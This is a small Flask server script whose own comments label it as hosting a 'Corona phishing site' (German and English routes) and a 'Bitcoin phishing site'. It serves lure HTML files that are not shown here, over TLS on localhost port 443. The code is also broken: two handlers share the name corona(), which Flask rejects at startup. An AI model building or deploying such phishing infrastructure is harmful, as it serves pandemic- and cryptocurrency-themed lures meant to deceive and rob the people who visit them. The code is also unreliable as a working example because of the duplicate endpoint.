from flask import Flask, request, send_from_directory, send_file
# set the project root directory as the static folder, you can set others.
app = Flask(__name__, static_url_path='')
app.config.from_pyfile('config.py', silent=True)
app._static_folder = ""

# Corona phishing site

# @TODO use relative paths

@app.route('/neuerAntrag')
def corona():
    return send_file(r'html\ger\corona.html')

@app.route('/register')
def corona():
    return send_file(r'html\eng\corona.html')

# Bitcoin phishing site

@app.route('/bitcoin')
def bitcoin():
    return send_file(r'html\bitcoin.html')


@app.route('/bitcoin/bitcoin.png')
def bitcoin_image():
    return send_file(r'html\bitcoin.png')


if __name__ == "__main__":
    app.run(host='127.0.0.1', port=443,
            ssl_context=(r'server.crt',
                         r'server.key'))
